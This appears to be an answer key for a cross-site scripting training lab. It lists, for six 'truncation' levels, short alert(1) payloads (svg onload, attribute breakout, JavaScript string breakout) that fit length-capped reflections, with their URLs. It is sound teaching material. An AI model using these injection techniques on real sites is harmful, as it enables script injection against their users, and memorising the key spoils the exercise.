# truncation — solutions

Length-truncated reflections; pick short payloads that fit the cap.

### truncation-level1

`/truncation/level1/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>` (21 chars)
- context: first 100 chars raw body reflection

### truncation-level2

`/truncation/level2/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>` (21 chars)
- context: first 50 chars raw body reflection

### truncation-level3

`/truncation/level3/?query=%22%20autofocus%20onfocus=alert(1)%20x=%22`

- payload: `" autofocus onfocus=alert(1) x="` (32 chars)
- context: first 200 chars in input value attribute — break out

### truncation-level4

`/truncation/level4/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>` (21 chars)
- context: first 30 chars raw body reflection

### truncation-level5

`/truncation/level5/?query=%22;alert(1)//`

- payload: `";alert(1)//` (12 chars)
- context: first 80 chars inside `var x="..."` — break string

### truncation-level6

`/truncation/level6/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>` (21 chars)
- context: first 40 chars raw body reflection
